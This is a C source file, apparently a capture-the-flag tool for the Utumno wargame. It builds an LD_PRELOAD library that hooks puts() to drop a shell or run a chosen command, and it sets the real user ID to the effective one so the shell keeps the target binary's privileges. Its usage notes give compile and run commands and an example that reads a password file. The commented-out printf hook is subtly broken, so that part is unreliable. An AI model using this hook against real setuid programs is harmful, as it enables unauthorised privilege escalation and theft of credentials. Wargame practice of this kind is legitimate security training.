/*
 * shell-hook.c — LD_PRELOAD shell spawner for CTF
 *
 * Hooks common libc functions (puts, write, printf) to escalate to a shell
 * when the target binary calls them. Useful when the binary outputs something
 * but you already have the password / just want a shell as the target user.
 *
 * Usage:
 *   # 64-bit target
 *   gcc -Wall -shared -fPIC -o shell-hook.so shell-hook.c
 *   # 32-bit target (add -m32, need gcc-multilib / libc6-dev-i386)
 *   gcc -Wall -shared -fPIC -m32 -o shell-hook32.so shell-hook.c
 *   LD_PRELOAD=./shell-hook.so /path/to/binary
 *
 * Which function it hooks:
 *   By default hooks puts(). If the binary doesn't call puts, try other
 *   functions below by uncommenting.
 *
 * Environment:
 *   SHELL_HOOK_CMD  — custom command to run (default: /bin/sh)
 *                     e.g. SHELL_HOOK_CMD="cat /etc/utumno_pass/utumno1"
 */

#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdio.h>

static void spawn_shell(void) {
    char *cmd = getenv("SHELL_HOOK_CMD");

    /* Prevent child process from inheriting LD_PRELOAD (avoids
     * ELFCLASS mismatch when target and .so differ in arch) */
    unsetenv("LD_PRELOAD");

    /* Sync RUID to EUID — dash / busybox sh drop privs otherwise */
    setreuid(geteuid(), geteuid());

    if (cmd) {
        /* Custom command — system() handles multi-word args properly */
        system(cmd);
    } else {
        /* Interactive shell */
        execlp("/bin/sh", "sh", (char *)NULL);
    }
}

int puts(const char *s) {
    static int (*real_puts)(const char *) = NULL;
    if (!real_puts)
        real_puts = dlsym(RTLD_NEXT, "puts");
    real_puts(s);
    spawn_shell();
    return 0; /* unreachable if exec succeeds */
}

/* Uncomment any of these if the binary doesn't call puts:
 *
int printf(const char *fmt, ...) {
    static int (*real_printf)(const char *, ...) = NULL;
    if (!real_printf)
        real_printf = dlsym(RTLD_NEXT, "printf");
    va_list args;
    va_start(args, fmt);
    real_printf(fmt, args);
    va_end(args);
    spawn_shell();
    return 0;
}

ssize_t write(int fd, const void *buf, size_t count) {
    static ssize_t (*real_write)(int, const void *, size_t) = NULL;
    if (!real_write)
        real_write = dlsym(RTLD_NEXT, "write");
    real_write(fd, buf, count);
    spawn_shell();
    return count;
}
*/
